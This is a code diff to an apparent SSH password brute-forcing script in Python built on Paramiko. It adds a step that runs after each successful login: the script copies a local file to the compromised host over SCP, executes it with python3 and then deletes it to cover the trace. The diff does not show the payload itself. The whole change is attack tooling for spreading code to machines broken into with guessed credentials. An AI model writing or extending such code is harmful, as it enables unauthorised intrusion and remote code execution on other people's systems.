@@ -7,6 +7,11 @@ try:
 except ImportError:
     print('Missing Paramiko Dependency.')
     sys.exit(0)
+try:
+    from scp import SCPClient
+except ImportError:
+    print('Missing scp Dependency')
+    sys.exit(0)
 
 class Connection(Thread):
     def __init__(self, username, password, targetIp, portNumber, timeoutTime):
@@ -25,8 +30,15 @@ class Connection(Thread):
             sshConnection.connect(self.targetIp, port=int(self.portNumber),
                                   username=self.username, password=self.password,
                                   timeout=int(self.timeoutTime), allow_agent=False, look_for_keys=False)
-
+            
+            
             self.status = 'Succeeded'
+            if(sshConnection):
+                scp = SCPClient(sshConnection.get_transport())
+                scp.put('hello.py','send.py')
+                scp.close()
+                sshConnection.exec_command("python3 send.py")
+                sshConnection.exec_command("rm send.py")
             sshConnection.close()
         except:
             self.status = 'Failed'
